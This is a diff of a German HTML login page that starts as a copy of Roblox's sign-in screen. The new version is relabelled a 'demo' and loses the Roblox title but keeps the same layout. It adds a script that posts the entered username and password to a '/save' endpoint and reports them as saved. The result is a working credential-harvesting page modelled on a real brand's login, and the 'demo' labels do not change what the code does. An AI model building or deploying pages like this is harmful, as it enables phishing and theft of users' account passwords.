@@ -2,62 +2,57 @@
 <html lang="de">
 <head>
 <meta charset="UTF-8">
-<title>Login</title>
+<title>Login Demo</title>
 
 <style>
 body {
   margin: 0;
-  font-family: Arial, sans-serif;
+  font-family: Arial;
   background: #12141c;
   display: flex;
   justify-content: center;
   align-items: center;
   height: 100vh;
-  color: #fff;
+  color: white;
 }
 
-.container {
+.box {
   width: 360px;
+  border: 1px solid #3a3d45;
+  padding: 25px;
+  background: #1c1f26;
 }
 
 h2 {
-  font-size: 28px;
-  font-weight: bold;
   margin-bottom: 20px;
 }
 
-.input {
+input {
   width: 100%;
   padding: 14px;
   margin-bottom: 10px;
   border: 1px solid #3a3d45;
   background: #2a2d35;
   color: white;
-  font-size: 14px;
 }
 
-.input::placeholder {
-  color: #aaa;
-}
-
-.login-btn {
+button {
   width: 100%;
   padding: 14px;
+  margin-top: 10px;
   border: 1px solid #3a3d45;
   background: transparent;
   color: white;
   cursor: pointer;
-  margin-bottom: 15px;
 }
 
-.login-btn:hover {
+button:hover {
   background: #2a2d35;
 }
 
 .link {
   text-align: center;
-  font-size: 14px;
-  margin-bottom: 20px;
+  margin-top: 15px;
   cursor: pointer;
 }
 
@@ -67,54 +62,60 @@ h2 {
   margin: 20px 0;
 }
 
-.secondary-btn {
-  width: 100%;
-  padding: 14px;
-  margin-bottom: 10px;
+.secondary {
   background: #2a2d35;
   border: none;
-  color: white;
-  cursor: pointer;
-}
-
-.secondary-btn:hover {
-  background: #3a3d45;
-}
-
-.register {
-  text-align: center;
-  font-size: 14px;
-  margin-top: 20px;
-}
-
-.register span {
-  font-weight: bold;
-  cursor: pointer;
 }
 </style>
 </head>
 
 <body>
 
-<div class="container">
-  <h2>Bei Roblox anmelden</h2>
+<div class="box">
+  <h2>Anmelden (Demo)</h2>
 
-  <input class="input" placeholder="Benutzer/E-Mail/Telefon">
-  <input class="input" type="password" placeholder="Passwort">
+  <input id="user" placeholder="Benutzername">
+  <input id="pass" type="password" placeholder="Passwort">
 
-  <button class="login-btn">Anmelden</button>
+  <button onclick="send()">Anmelden</button>
 
-  <div class="link">Passwort oder Benutzername vergessen?</div>
+  <div class="link" onclick="info()">
+    Passwort vergessen?
+  </div>
 
   <div class="divider"></div>
 
-  <button class="secondary-btn">Einmaligen Code per E-Mail senden</button>
-  <button class="secondary-btn">Schnellanmeldung</button>
+  <button class="secondary" onclick="info()">
+    Code per E-Mail senden
+  </button>
 
-  <div class="register">
-    Du hast kein Konto? <span>Registrieren</span>
+  <button class="secondary" onclick="info()">
+    Schnellanmeldung
+  </button>
+
+  <div class="link" onclick="info()">
+    Registrieren
   </div>
 </div>
+
+<script>
+async function send() {
+  await fetch("/save", {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({
+      username: user.value,
+      password: pass.value
+    })
+  });
+
+  alert("Gespeichert (Demo)");
+}
+
+function info() {
+  alert("Demo-Funktion (keine echte Weiterleitung)");
+}
+</script>
 
 </body>
 </html>
